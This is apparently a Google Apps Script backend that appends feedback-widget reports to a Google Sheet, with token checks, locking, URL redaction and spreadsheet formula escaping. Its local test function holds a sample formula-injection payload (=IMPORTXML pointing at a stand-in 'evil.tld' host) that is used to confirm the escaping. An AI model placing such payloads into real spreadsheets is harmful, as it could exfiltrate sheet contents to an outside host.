/**
 * Unhyped Feedback – sink
 *
 * Receives feedback reports and appends them to a Sheet.
 * Called server-side only (from a Next.js route handler), never from a browser.
 *
 * Setup: see README.md. Run setup() once from the editor before deploying.
 */

var SCHEMA_VERSION = 1;

/** Column order. ADDITIVE ONLY – append new columns, never rename or reorder. */
var HEADERS = [
  'id',
  'received_at',
  'project',
  'environment',
  'schema_version',
  'type',
  'severity',
  'what',
  'why',
  'how',
  'page_path',
  'page_url',
  'page_title',
  'viewport',
  'screen',
  'browser',
  'os',
  'device',
  'color_scheme',
  'language',
  'timezone',
  'country',
  'session_id',
  'time_on_page_s',
  'pages_visited',
  'console_errors',
  'app_version',
  'reporter_email',
  'user_agent_raw',
  'deployment',
  'status',
  'notes',
  'reporter'
];

/** Query params whose VALUES are replaced before storage. */
var PARAM_DENYLIST = [
  'token', 'key', 'secret', 'password', 'pwd', 'code',
  'email', 'session', 'auth', 'signature', 'access_token', 'id_token'
];

var MAX_TEXT = 2000;
var MAX_ERRORS = 4000;

/**
 * How long a submission waits for the script lock before answering `busy`.
 *
 * The lock is script-wide. A write normally holds it for well under a second,
 * so three seconds is enough for two reporters pressing send together. It is
 * deliberately short: a Google call that stalls while holding the lock keeps
 * it until the execution is killed, up to six minutes, and every submission
 * arriving in that window has to be told quickly and honestly that nothing was
 * written. The route gives the sink 14 s in total, cold start included.
 */
var LOCK_WAIT_MS = 3000;

// ---------------------------------------------------------------- entrypoints

/**
 * Warm-up ping. The widget fires this when the panel opens, so the
 * container is already awake by the time the user hits send.
 */
function doGet(e) {
  return json_({
    ok: true,
    warm: true,
    schemaVersion: SCHEMA_VERSION,
    deployment: deployment_()
  });
}

/**
 * Every failure answer names the `stage` it happened in, and `server` carries
 * the exception text, so the route handler's log says where the sink was when
 * it gave up. Without it an incident reads as "sink rejected: server" six
 * times, which is what the October 2026 outage looked like from Vercel.
 */
function doPost(e) {
  var stage = 'parse';
  var lock = null;

  try {
    if (!e || !e.postData || !e.postData.contents) {
      return json_({ ok: false, error: 'empty_body' });
    }

    var body;
    try {
      body = JSON.parse(e.postData.contents);
    } catch (err) {
      return json_({ ok: false, error: 'bad_json' });
    }

    // Apps Script does NOT expose custom request headers to doPost.
    // The shared secret therefore travels in the body, not in X-Feedback-Token.
    stage = 'auth';
    var expected = prop_('FEEDBACK_TOKEN');
    if (!expected || String(body.token) !== expected) {
      return json_({ ok: false, error: 'unauthorized' });
    }

    var invalid = ['type', 'severity', 'what', 'why'].filter(function (k) {
      return !body[k] || String(body[k]).trim().length < 3;
    });
    if (invalid.length) {
      return json_({ ok: false, error: 'validation', fields: invalid });
    }

    // Everything that can happen without the lock happens before it: open the
    // sheet, read the headers, build the row. Each of these is a remote call
    // that can stall, and a stall inside the locked region blocks every other
    // submission until Apps Script kills the execution.
    stage = 'open_sheet';
    var ss = spreadsheet_();
    var sheet = ss.getSheetByName(tabName_());
    stage = 'read_headers';
    var headers = sheet && sheet.getLastRow() > 0 ? headerRow_(sheet) : [];
    var deployment = deployment_();
    var id = 'fb_' + Utilities.getUuid().replace(/-/g, '').slice(0, 10);
    var record = buildRecord_(id, body, deployment);
    var row = rowFor_(headers, record);

    // The lock covers the header sync and the append. The sync is a
    // read-then-write of the header row, and two first reports after a
    // redeploy must not both add the missing column. Wait briefly, then give
    // up: `busy` after three seconds is something the widget can explain and
    // the reporter can retry; a 10 s wait that ends in a generic error is not.
    stage = 'lock';
    lock = LockService.getScriptLock();
    if (!lock.tryLock(LOCK_WAIT_MS)) {
      lock = null;
      return json_({ ok: false, error: 'busy', stage: stage });
    }

    // A missing tab, an empty sheet, or a column added by a newer Code.gs is
    // fixed on the first report that sees it, and only under the lock: two
    // first reports arriving together must not both create the tab or both
    // append the column. Re-read the headers here, not above, for the same
    // reason. On a sheet that is in order this branch never runs.
    if (!sheet || !headers.length || missingHeaders_(headers).length) {
      stage = 'sync_headers';
      sheet = sheet_(ss);
      headers = syncHeaders_(sheet);
      row = rowFor_(headers, record);
    }

    stage = 'append';
    sheet.appendRow(row);
    // Commit before the lock is released, so the next holder sees this row.
    SpreadsheetApp.flush();

    return json_({ ok: true, id: id, deployment: deployment });

  } catch (err) {
    return json_({
      ok: false,
      error: 'server',
      stage: stage,
      message: String(err).slice(0, 300)
    });

  } finally {
    if (lock) { try { lock.releaseLock(); } catch (ignored) {} }
  }
}

// -------------------------------------------------------------------- mapping

function buildRecord_(id, b, deployment) {
  var ctx = b.context || {};

  return {
    id:              id,
    received_at:     new Date().toISOString(),   // server clock, never the client's
    project:         text_(b.project, 120),
    environment:     text_(b.environment, 40),
    schema_version:  b.schemaVersion || SCHEMA_VERSION,

    type:            text_(b.type, 40),
    severity:        text_(b.severity, 40),
    what:            text_(b.what, MAX_TEXT),
    why:             text_(b.why, MAX_TEXT),
    how:             text_(b.how, MAX_TEXT),

    page_path:       text_(ctx.pathname, 500),
    page_url:        text_(redactUrl_(ctx.href), 1000),
    page_title:      text_(ctx.title, 300),

    viewport:        text_(ctx.viewport, 40),
    screen:          text_(ctx.screen, 40),
    browser:         text_(ctx.browser, 80),
    os:              text_(ctx.os, 80),
    device:          text_(ctx.device, 40),
    color_scheme:    text_(ctx.colorScheme, 20),
    language:        text_(ctx.language, 40),
    timezone:        text_(ctx.timezone, 80),
    country:         text_(b.country, 8),

    session_id:      text_(ctx.sessionId, 60),
    time_on_page_s:  Number(ctx.timeOnPage || 0),
    pages_visited:   text_((ctx.pagesVisited || []).join(' → '), 500),
    console_errors:  text_((ctx.consoleErrors || []).join('\n'), MAX_ERRORS),
    app_version:     text_(ctx.appVersion, 60),

    reporter_email:  text_(b.email, 200),
    user_agent_raw:  text_(ctx.userAgent, 500),
    deployment:      deployment,

    status:          '',   // filled in by hand – this is the client-facing column
    notes:           '',   // internal. See README before sharing the sheet.

    reporter:        text_(b.reporter, 120)   // who filed it, as typed in the widget
  };
}

/** Write by header NAME, never by index: the sheet owner will reorder columns. */
function rowFor_(headers, record) {
  return headers.map(function (name) {
    return escapeCell_(record[name]);
  });
}

// ------------------------------------------------------------------ sanitising

/**
 * Sheets evaluates any cell beginning with = + – @ or a control character.
 * A report containing =IMPORTXML(...) would exfiltrate the sheet's contents
 * the moment someone opens it. Every text cell goes through this.
 */
function escapeCell_(value) {
  if (value === null || value === undefined) return '';
  if (typeof value === 'number') return value;

  var s = String(value);
  if (s.length === 0) return '';

  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/** Replaces the VALUES of sensitive query params, keeping names for diagnosis. */
function redactUrl_(url) {
  if (!url) return '';
  var s = String(url);
  var q = s.indexOf('?');
  if (q === -1) return s;

  var base = s.slice(0, q);
  var rest = s.slice(q + 1);

  var hash = '';
  var h = rest.indexOf('#');
  if (h !== -1) { hash = rest.slice(h); rest = rest.slice(0, h); }

  var cleaned = rest.split('&').map(function (pair) {
    var eq = pair.indexOf('=');
    if (eq === -1) return pair;
    var name = pair.slice(0, eq);
    var isSensitive = PARAM_DENYLIST.indexOf(name.toLowerCase()) !== -1;
    return name + '=' + (isSensitive ? '[redacted]' : pair.slice(eq + 1));
  }).join('&');

  return base + '?' + cleaned + hash;
}

function text_(value, max) {
  if (value === null || value === undefined) return '';
  var s = String(value).trim();
  return s.length > max ? s.slice(0, max) + ' […]' : s;
}

// ---------------------------------------------------------------------- sheet

function spreadsheet_() {
  var id = prop_('SHEET_ID');
  if (!id) throw new Error('SHEET_ID script property is not set');
  return SpreadsheetApp.openById(id);
}

function tabName_() {
  return prop_('SHEET_TAB') || 'reports';
}

/**
 * The reports tab, created and given its header row if it does not exist yet.
 * Writes, so on the submission path it is only called under the lock.
 */
function sheet_(ss) {
  ss = ss || spreadsheet_();
  var name = tabName_();
  var sheet = ss.getSheetByName(name);
  if (!sheet) sheet = ss.insertSheet(name);

  if (sheet.getLastRow() === 0) writeHeaders_(sheet);
  return sheet;
}

function headerRow_(sheet) {
  return sheet.getRange(1, 1, 1, sheet.getLastColumn())
              .getValues()[0]
              .map(function (h) { return String(h).trim(); });
}

/**
 * Returns the header row, after appending any column from HEADERS the sheet
 * does not have yet. This is what makes "additive only" true in practice: a
 * new field in Code.gs shows up as a new column at the far right of an
 * existing sheet, instead of being dropped silently because nobody typed the
 * header by hand. Existing columns are never moved, renamed or removed.
 */
function syncHeaders_(sheet) {
  var existing = headerRow_(sheet);
  var missing = missingHeaders_(existing);
  if (!missing.length) return existing;

  var start = sheet.getLastColumn() + 1;
  var shortBy = start + missing.length - 1 - sheet.getMaxColumns();
  if (shortBy > 0) sheet.insertColumnsAfter(sheet.getMaxColumns(), shortBy);

  sheet.getRange(1, start, 1, missing.length).setValues([missing]).setFontWeight('bold');
  return existing.concat(missing);
}

/** Names from HEADERS that the given header row does not have. */
function missingHeaders_(existing) {
  return HEADERS.filter(function (name) {
    return existing.indexOf(name) === -1;
  });
}

function writeHeaders_(sheet) {
  sheet.getRange(1, 1, 1, HEADERS.length).setValues([HEADERS]);
  sheet.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold');
  sheet.setFrozenRows(1);
}

function prop_(key) {
  return PropertiesService.getScriptProperties().getProperty(key);
}

function deployment_() {
  return prop_('DEPLOYMENT_VERSION') || 'dev';
}

function json_(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

// ----------------------------------------------------------------- setup / test
//
// These two are deliberately NOT suffixed with an underscore, unlike every
// other helper in this file. In Apps Script a trailing underscore marks a
// function as private, and a private function does not appear in the editor's
// Run dropdown – which makes it impossible to run the one thing you are
// supposed to run before deploying. Do not "fix" them to match the convention.

/** Run once from the editor, after setting the script properties. */
function setup() {
  var sheet = sheet_();
  if (sheet.getLastRow() === 0) writeHeaders_(sheet);
  syncHeaders_(sheet);
  Logger.log('Sheet ready: ' + sheet.getName() + ' with ' + HEADERS.length + ' columns');
  Logger.log('Token set: ' + (prop_('FEEDBACK_TOKEN') ? 'yes' : 'NO – set it before deploying'));
}

/** Run from the editor to append a row without deploying. */
function testLocal() {
  var res = doPost({
    postData: {
      contents: JSON.stringify({
        token: prop_('FEEDBACK_TOKEN'),
        schemaVersion: 1,
        project: 'local-test',
        environment: 'development',
        type: 'bug',
        severity: 'annoying',
        what: '=IMPORTXML("https://evil.tld","//a")',   // must land escaped
        why: 'Sprawdzam, czy escape formuł działa.',
        how: '',
        reporter: 'Test Lokalny',
        context: {
          pathname: '/cennik',
          href: 'https://example.com/cennik?token=SECRET123&utm_source=nl',
          title: 'Cennik',
          viewport: '1440×900',
          browser: 'Chrome 141',
          os: 'macOS 15',
          consoleErrors: ['TypeError: x is not a function']
        }
      })
    }
  });
  Logger.log(res.getContent());
}
